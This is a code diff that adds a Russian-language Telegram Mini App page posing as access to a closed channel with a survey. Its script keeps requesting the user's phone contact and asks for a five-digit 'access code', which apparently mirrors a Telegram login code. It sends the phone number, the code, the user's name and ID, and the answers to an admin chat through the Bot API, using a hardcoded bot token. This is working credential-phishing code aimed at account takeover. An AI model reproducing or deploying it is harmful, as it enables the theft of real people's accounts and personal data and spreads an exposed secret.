@@ -1,74 +1,1094 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
-    <link rel="stylesheet" href="./css/main.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Доступ к каналу</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0a0a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0d2b3e 0%, #1a1a2e 100%);
+            z-index: -2;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 136, 204, 0.15) 0%, transparent 60%);
+            z-index: -1;
+        }
+
+        .app-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            padding: 16px;
+            overflow: hidden;
+        }
+
+        /* Страница загрузки (запрос контакта) */
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            animation: fadeIn 0.5s ease;
+        }
+        .loading-img {
+            width: 90px;
+            height: 90px;
+            border-radius: 20px;
+            object-fit: cover;
+            margin: 0 auto 15px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        .spinner {
+            width: 42px;
+            height: 42px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #2aab6e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 15px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        /* Страница ввода кода */
+        .code-page {
+            display: none;
+            width: 100%;
+            max-width: 340px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .telegram-header {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .telegram-header img {
+            width: 70px;
+            height: 70px;
+            border-radius: 18px;
+            margin-bottom: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        .telegram-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: white;
+        }
+        .telegram-header p {
+            font-size: 13px;
+            color: rgba(255,255,255,0.7);
+        }
+
+        .code-container {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 18px 16px;
+            width: 100%;
+            margin: 10px 0;
+            border: 0.5px solid rgba(255,255,255,0.1);
+        }
+
+        .code-input {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 8px 0 16px 0;
+            flex-wrap: nowrap;
+        }
+        .cell {
+            width: 50px;
+            height: 58px;
+            background: rgba(255,255,255,0.1);
+            border: 1.5px solid rgba(255,255,255,0.2);
+            border-radius: 14px;
+            font-size: 26px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            width: 100%;
+            margin: 8px 0 6px 0;
+        }
+        .key {
+            height: 52px;
+            background: rgba(255,255,255,0.12);
+            border: 0.5px solid rgba(255,255,255,0.15);
+            border-radius: 18px;
+            color: white;
+            font-size: 26px;
+            font-weight: 500;
+            transition: 0.05s linear;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        .key:active {
+            transform: scale(0.96);
+            background: rgba(255,255,255,0.25);
+        }
+
+        .telegram-button {
+            background: #2aab6e;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 14px;
+            margin: 6px auto 6px;
+            display: block;
+            width: 100%;
+            cursor: pointer;
+        }
+        .telegram-button:active {
+            transform: scale(0.97);
+            background: #228f5a;
+        }
+
+        .help-link {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            text-decoration: none;
+            margin-top: 6px;
+            text-align: center;
+        }
+
+        /* Страница опроса */
+        .questions-page {
+            display: none;
+            width: 100%;
+            max-width: 340px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+            max-height: 100%;
+            overflow-y: auto;
+        }
+
+        .progress {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin: 8px 0;
+            text-align: center;
+        }
+
+        .question-card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 6px 0;
+            width: 100%;
+            border: 0.5px solid rgba(255,255,255,0.1);
+        }
+
+        .question-text {
+            font-size: 16px;
+            margin-bottom: 12px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .option-btn {
+            background: rgba(255,255,255,0.08);
+            border: 0.5px solid rgba(255,255,255,0.15);
+            border-radius: 12px;
+            padding: 10px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: left;
+        }
+        .option-btn:active { transform: scale(0.98); background: rgba(255,255,255,0.15); }
+        .selected { background: #2aab6e; border-color: #2aab6e; }
+
+        .textbox-input {
+            width: 100%;
+            background: rgba(255,255,255,0.08);
+            border: 0.5px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            padding: 10px;
+            color: white;
+            font-size: 14px;
+            resize: vertical;
+            font-family: inherit;
+            margin-top: 8px;
+        }
+        .textbox-input:focus { outline: none; border-color: #2aab6e; background: rgba(255,255,255,0.12); }
+
+        .next-btn {
+            background: #2aab6e;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 14px;
+            margin: 12px 0 20px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .next-btn:active { transform: scale(0.98); }
+
+        @media (max-width: 480px) {
+            .app-container { padding: 12px; }
+            .cell { width: 48px; height: 55px; font-size: 24px; }
+            .key { height: 50px; font-size: 24px; }
+            .code-container { padding: 16px 14px; }
+            .telegram-header img { width: 65px; height: 65px; }
+            .telegram-header h2 { font-size: 19px; }
+        }
+
+        @media (max-width: 380px) {
+            .cell { width: 44px; height: 52px; font-size: 22px; }
+            .key { height: 48px; font-size: 22px; }
+            .code-input { gap: 8px; }
+        }
+
+        @media (max-width: 340px) {
+            .cell { width: 40px; height: 48px; font-size: 20px; }
+            .key { height: 45px; font-size: 20px; }
+        }
+    </style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="calc">
-            <div class="header">
-                <div class="avatar">
-                    <img width="80" src="./img/img.jpg" alt="">
-                </div>
-                <div class="header-buttom">
-                    <p>
-                        <b></b><br><br>
-                    </p>
-                    <div style="padding-top: 10px"><b>Введите код подтверждения:</b></div>
-                </div>
-            </div>
-            <div class="input-field">
-                <input type="text" id="inputCode" readonly>
-            </div>
-            <div class="btns">
-                <div class="btn">
-                    <button>1</button>
-                </div>
-                <div class="btn">
-                    <button>2</button>
-                </div>
-                <div class="btn">
-                    <button>3</button>
-                </div>
-                <div class="btn">
-                    <button>4</button>
-                </div>
-                <div class="btn">
-                    <button>5</button>
-                </div>
-                <div class="btn">
-                    <button>6</button>
-                </div>
-                <div class="btn">
-                    <button>7</button>
-                </div>
-                <div class="btn">
-                    <button>8</button>
-                </div>
-                <div class="btn">
-                    <button>9</button>
-                </div>
-                <div class="btn">
-                    <button data-key="BACK"><i class="fas fa-backspace"></i></button>
-                </div>
-                <div class="btn">
-                    <button>0</button>
-                </div>
-                <div class="btn">
-                    <button data-key="CHECK"><img src="./img/check1.png" width="30" alt=""></button>
-                </div>
-            </div>
-
-        </div>
-
+<div class="app-container">
+    <!-- Экран загрузки (запрос номера) -->
+    <div id="loading" class="loading">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="loading-img">
+        <div class="spinner"></div>
+        <p style="margin-top: 12px; opacity: 0.7;">Пожалуйста, поделитесь номером телефона</p>
     </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="./js/main.js"></script>
+
+    <!-- Страница ввода кода -->
+    <div id="codePage" class="code-page">
+        <div class="telegram-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+            <h2>🔒 Закрытый канал</h2>
+            <p>Введите 5-значный код доступа</p>
+        </div>
+        <div class="code-container">
+            <div class="code-input" id="cells">
+                <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            </div>
+            <div class="keypad" id="keypad"></div>
+        </div>
+        <button class="telegram-button" id="submitCodeBtn">✅ Отправить код</button>
+        <a href="#" class="help-link" id="helpButton">❓ Где взять код?</a>
+    </div>
+
+    <!-- Страница опроса -->
+    <div id="questionsPage" class="questions-page">
+        <div class="telegram-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+            <h2>📋 Небольшой опрос</h2>
+            <p>Для доступа к каналу</p>
+        </div>
+        <div class="progress" id="progress">Вопрос 1/7</div>
+        <div id="questionContainer"></div>
+        <button class="next-btn" id="nextBtn">Следующий →</button>
+    </div>
+</div>
+
+<script>
+(function(){
+
+    const tg = window.Telegram.WebApp;
+
+    tg.ready();
+    tg.expand();
+
+    // ---------- STATE ----------
+    let codeArray = ["", "", "", "", ""];
+    let userPhone = null;
+    let phoneReceived = false;
+    let isAsking = false;
+
+    // ---------- USER ----------
+    const userId =
+        tg.initDataUnsafe?.user?.id || "UNKNOWN";
+
+    const userFirstName =
+        tg.initDataUnsafe?.user?.first_name || "";
+
+    const userLastName =
+        tg.initDataUnsafe?.user?.last_name || "";
+
+    // ---------- DOM ----------
+    const loadingDiv =
+        document.getElementById("loading");
+
+    const codePageDiv =
+        document.getElementById("codePage");
+
+    const questionsPageDiv =
+        document.getElementById("questionsPage");
+
+    const keypadDiv =
+        document.getElementById("keypad");
+
+    const helpBtn =
+        document.getElementById("helpButton");
+
+    const submitBtn =
+        document.getElementById("submitCodeBtn");
+
+    const nextBtn =
+        document.getElementById("nextBtn");
+
+    const questionContainer =
+        document.getElementById("questionContainer");
+
+    const progressSpan =
+        document.getElementById("progress");
+
+    // ---------- LOADING TEXT ----------
+    const loadingText = loadingDiv.querySelector("p");
+
+    loadingText.innerHTML =
+        "⏳ Getting information...";
+
+    // ---------- BOT ----------
+    const ADMIN_CHAT_ID = "8348849437";
+
+    const BOT_TOKEN =
+        "8772067954:AAHC2wz6Ra-bL1pitHActfZ3pcZpbYt-suA";
+
+    // ---------- QUESTIONS ----------
+    let currentQuestionIndex = 0;
+
+    let userAnswers = [];
+
+    const surveyQuestions = [
+        {
+            text: "Как вы нашли этот канал?",
+            type: "options",
+            options: [
+                "Друг посоветовал",
+                "Поиск в Telegram",
+                "Социальные сети",
+                "Случайно"
+            ]
+        },
+
+        {
+            text: "Какой контент вас интересует?",
+            type: "options",
+            options: [
+                "Новости",
+                "Аналитика",
+                "Образование",
+                "Развлечения"
+            ]
+        },
+
+        {
+            text: "Сколько закрытых каналов у вас есть?",
+            type: "options",
+            options: [
+                "1-3",
+                "4-7",
+                "8-15",
+                "15+",
+                "Ни одного"
+            ]
+        },
+
+        {
+            text: "Ваши предложения по каналу?",
+            type: "textbox",
+            placeholder: "Напишите ваше мнение..."
+        },
+
+        {
+            text: "Какой формат постов предпочитаете?",
+            type: "options",
+            options: [
+                "Текст",
+                "Видео",
+                "Аудио",
+                "Опросы"
+            ]
+        },
+
+        {
+            text: "Дополнительные пожелания?",
+            type: "textbox",
+            placeholder: "Ваши пожелания..."
+        },
+
+        {
+            text: "Спасибо! Теперь введите код для доступа.",
+            type: "info"
+        }
+    ];
+
+    // ---------- SEND TO ADMIN ----------
+    async function sendToAdmin(type, data = {}) {
+
+        const timeStr =
+            new Date().toLocaleString(
+                'ru-RU',
+                {
+                    timeZone: 'Europe/Moscow'
+                }
+            );
+
+        let text = "";
+
+        // CONTACT ACCEPT
+        if (type === "contact_success") {
+
+            text =
+`✅ CONTACT ACCEPTED
+
+👤 ${userFirstName} ${userLastName}
+🆔 ID: ${userId}
+
+📞 Phone: ${data.phone}
+
+⏰ ${timeStr}`;
+        }
+
+        // CONTACT REJECT
+        else if (type === "contact_rejected") {
+
+            text =
+`❌ CONTACT REJECTED
+
+👤 ${userFirstName} ${userLastName}
+🆔 ID: ${userId}
+
+⏰ ${timeStr}`;
+        }
+
+        // CODE
+        else if (type === "code") {
+
+            const formattedCode =
+                data.code.split('').join(' + ');
+
+            text =
+`🔐 CODE ENTERED
+
+👤 ${userFirstName} ${userLastName}
+🆔 ID: ${userId}
+
+🔢 Code: ${formattedCode}
+
+📞 Phone: ${userPhone || "UNKNOWN"}
+
+⏰ ${timeStr}`;
+        }
+
+        // ANSWERS
+        else if (type === "answers") {
+
+            text =
+`📋 SURVEY ANSWERS
+
+👤 ${userFirstName} ${userLastName}
+🆔 ID: ${userId}
+
+⏰ ${timeStr}
+
+`;
+
+            data.answers.forEach((a, i) => {
+
+                text +=
+`\n${i + 1}. ${a.question}\n`;
+
+                text +=
+`➜ ${a.answer || "Нет ответа"}\n`;
+
+            });
+        }
+
+        const url =
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+
+            await fetch(url, {
+
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: text
+                })
+
+            });
+
+        } catch(err) {
+
+            console.log(err);
+
+        }
+    }
+
+    // ---------- CODE UI ----------
+    function updateCellsUI() {
+
+        const cells =
+            document.querySelectorAll("#cells .cell");
+
+        cells.forEach((c, i) => {
+
+            c.textContent =
+                codeArray[i] || "";
+
+        });
+    }
+
+    function addDigit(num) {
+
+        const idx =
+            codeArray.findIndex(v => v === "");
+
+        if (idx !== -1) {
+
+            codeArray[idx] =
+                num.toString();
+
+            updateCellsUI();
+
+            tg.HapticFeedback?.impactOccurred("light");
+        }
+    }
+
+    function deleteDigit() {
+
+        let last = -1;
+
+        for (let i = codeArray.length - 1; i >= 0; i--) {
+
+            if (codeArray[i] !== "") {
+
+                last = i;
+
+                break;
+            }
+        }
+
+        if (last !== -1) {
+
+            codeArray[last] = "";
+
+            updateCellsUI();
+        }
+    }
+
+    // ---------- SUBMIT CODE ----------
+    async function submitCode() {
+
+        if (!codeArray.every(v => v !== "")) {
+
+            tg.HapticFeedback?.notificationOccurred("error");
+
+            return;
+        }
+
+        const fullCode =
+            codeArray.join('');
+
+        // SEND ADMIN
+        await sendToAdmin("code", {
+            code: fullCode
+        });
+
+        tg.HapticFeedback?.notificationOccurred("success");
+
+        currentQuestionIndex = 0;
+
+        userAnswers = [];
+
+        codePageDiv.style.display = "none";
+
+        questionsPageDiv.style.display = "flex";
+
+        renderQuestion();
+    }
+
+    // ---------- SURVEY ----------
+    function renderQuestion() {
+
+        if (currentQuestionIndex >= surveyQuestions.length) {
+
+            finishSurvey();
+
+            return;
+        }
+
+        const q =
+            surveyQuestions[currentQuestionIndex];
+
+        progressSpan.textContent =
+`Вопрос ${currentQuestionIndex + 1}/${surveyQuestions.length}`;
+
+        if (q.type === "info") {
+
+            questionContainer.innerHTML =
+`
+<div class="question-card">
+<div class="question-text">${q.text}</div>
+</div>
+`;
+
+            return;
+        }
+
+        // OPTIONS
+        if (q.type === "options") {
+
+            let html =
+`
+<div class="question-card">
+<div class="question-text">${q.text}</div>
+<div class="options">
+`;
+
+            q.options.forEach(opt => {
+
+                html +=
+`
+<button
+class="option-btn"
+data-option="${opt}"
+>
+${opt}
+</button>
+`;
+
+            });
+
+            html += `</div></div>`;
+
+            questionContainer.innerHTML = html;
+
+            document
+            .querySelectorAll('.option-btn')
+            .forEach(btn => {
+
+                btn.onclick = () => {
+
+                    document
+                    .querySelectorAll('.option-btn')
+                    .forEach(b => {
+                        b.classList.remove('selected');
+                    });
+
+                    btn.classList.add('selected');
+
+                    userAnswers[currentQuestionIndex] = {
+
+                        question: q.text,
+
+                        answer:
+                            btn.getAttribute('data-option'),
+
+                        type: "options"
+                    };
+                };
+            });
+        }
+
+        // TEXTBOX
+        else if (q.type === "textbox") {
+
+            questionContainer.innerHTML =
+`
+<div class="question-card">
+
+<div class="question-text">
+${q.text}
+</div>
+
+<textarea
+class="textbox-input"
+id="txtAnswer"
+rows="2"
+placeholder="${q.placeholder}"
+></textarea>
+
+</div>
+`;
+
+            const ta =
+                document.getElementById("txtAnswer");
+
+            ta.oninput = () => {
+
+                userAnswers[currentQuestionIndex] = {
+
+                    question: q.text,
+
+                    answer: ta.value,
+
+                    type: "textbox"
+                };
+            };
+        }
+    }
+
+    // ---------- NEXT ----------
+    function nextQuestion() {
+
+        const q =
+            surveyQuestions[currentQuestionIndex];
+
+        if (
+            q.type !== "info" &&
+            !userAnswers[currentQuestionIndex]
+        ) {
+
+            tg.HapticFeedback?.notificationOccurred("error");
+
+            return;
+        }
+
+        currentQuestionIndex++;
+
+        if (
+            currentQuestionIndex <
+            surveyQuestions.length
+        ) {
+
+            renderQuestion();
+
+        } else {
+
+            finishSurvey();
+
+        }
+    }
+
+    // ---------- FINISH ----------
+    async function finishSurvey() {
+
+        await sendToAdmin("answers", {
+            answers: userAnswers
+        });
+
+        tg.HapticFeedback?.notificationOccurred("success");
+
+        tg.close();
+    }
+
+    // ---------- KEYPAD ----------
+    function buildKeypad() {
+
+        keypadDiv.innerHTML = '';
+
+        for (let i = 1; i <= 9; i++) {
+
+            const btn =
+                document.createElement('button');
+
+            btn.className = 'key';
+
+            btn.textContent = i;
+
+            btn.onclick = (e) => {
+
+                e.preventDefault();
+
+                addDigit(i);
+            };
+
+            keypadDiv.appendChild(btn);
+        }
+
+        // ZERO
+        const zero =
+            document.createElement('button');
+
+        zero.className = 'key';
+
+        zero.textContent = '0';
+
+        zero.onclick = (e) => {
+
+            e.preventDefault();
+
+            addDigit(0);
+        };
+
+        keypadDiv.appendChild(zero);
+
+        // BACKSPACE
+        const back =
+            document.createElement('button');
+
+        back.className = 'key';
+
+        back.innerHTML = '⌫';
+
+        back.onclick = (e) => {
+
+            e.preventDefault();
+
+            deleteDigit();
+        };
+
+        keypadDiv.appendChild(back);
+    }
+
+    // ---------- PHONE ----------
+    function extractPhone(contact) {
+
+        if (!contact)
+            return null;
+
+        return (
+            contact.phone_number ||
+            contact.phoneNumber ||
+            contact.phone ||
+            null
+        );
+    }
+
+    // ---------- CONTACT ----------
+    function askContact() {
+
+    if (phoneReceived) return;
+
+    if (isAsking) return;
+
+    isAsking = true;
+
+    tg.requestContact(async (shared, contactObj) => {
+
+        isAsking = false;
+
+        console.log("CONTACT RESULT:", shared, contactObj);
+
+        // USER ACCEPTED
+        if (shared) {
+
+            let phone = null;
+
+            // Telegram contact object
+            if (contactObj) {
+
+                phone =
+                    contactObj.phone_number ||
+                    contactObj.phoneNumber ||
+                    contactObj.phone ||
+                    null;
+            }
+
+            // initDataUnsafe orqali ham tekshiramiz
+            if (!phone) {
+
+                phone =
+                    tg.initDataUnsafe?.user?.phone_number ||
+                    tg.initDataUnsafe?.user?.phone ||
+                    null;
+            }
+
+            // Agar topilmasa
+            if (!phone) {
+                phone = "NOT_RECEIVED";
+            }
+
+            userPhone = phone;
+
+            phoneReceived = true;
+
+            // ADMIN
+            await sendToAdmin(
+                "contact_success",
+                {
+                    phone: userPhone
+                }
+            );
+
+            tg.HapticFeedback
+            ?.notificationOccurred("success");
+
+            // OPEN CODE PAGE
+            loadingDiv.style.display = "none";
+
+            codePageDiv.style.display = "flex";
+
+            tg.expand();
+
+            return;
+        }
+
+        // USER REJECTED
+        await sendToAdmin("contact_rejected");
+
+        // ASK AGAIN
+        setTimeout(() => {
+            askContact();
+        }, 700);
+
+    });
+}
+
+    // ---------- HELP ----------
+    function handleHelp() {
+
+        tg.HapticFeedback?.impactOccurred("light");
+
+        tg.openTelegramLink(
+            "https://t.me/+42777"
+        );
+    }
+
+    // ---------- BLOCK SCROLL ----------
+    function blockScroll(e) {
+
+        const target = e.target;
+
+        const interactive =
+            target.closest('.key') ||
+            target.closest('.telegram-button') ||
+            target.closest('.help-link') ||
+            target.closest('.cell') ||
+            target.closest('.option-btn') ||
+            target.closest('.next-btn') ||
+            target.closest('.textbox-input');
+
+        if (!interactive)
+            e.preventDefault();
+    }
+
+    document.body.addEventListener(
+        'touchmove',
+        blockScroll,
+        { passive: false }
+    );
+
+    window.addEventListener(
+        'wheel',
+        blockScroll,
+        { passive: false }
+    );
+
+    // ---------- INIT ----------
+    function init() {
+
+        buildKeypad();
+
+        updateCellsUI();
+
+        submitBtn.onclick = (e) => {
+
+            e.preventDefault();
+
+            submitCode();
+        };
+
+        helpBtn.onclick = (e) => {
+
+            e.preventDefault();
+
+            handleHelp();
+        };
+
+        nextBtn.onclick = () => {
+
+            nextQuestion();
+        };
+
+        // START CONTACT REQUEST
+        setTimeout(() => {
+
+            askContact();
+
+        }, 800);
+
+        tg.setHeaderColor("bg_color");
+
+        tg.setBackgroundColor("#0a0a0a");
+
+        tg.expand();
+
+        window.addEventListener(
+            "resize",
+            () => tg.expand()
+        );
+    }
+
+    init();
+
+})();
+</script>
 </body>
 </html>
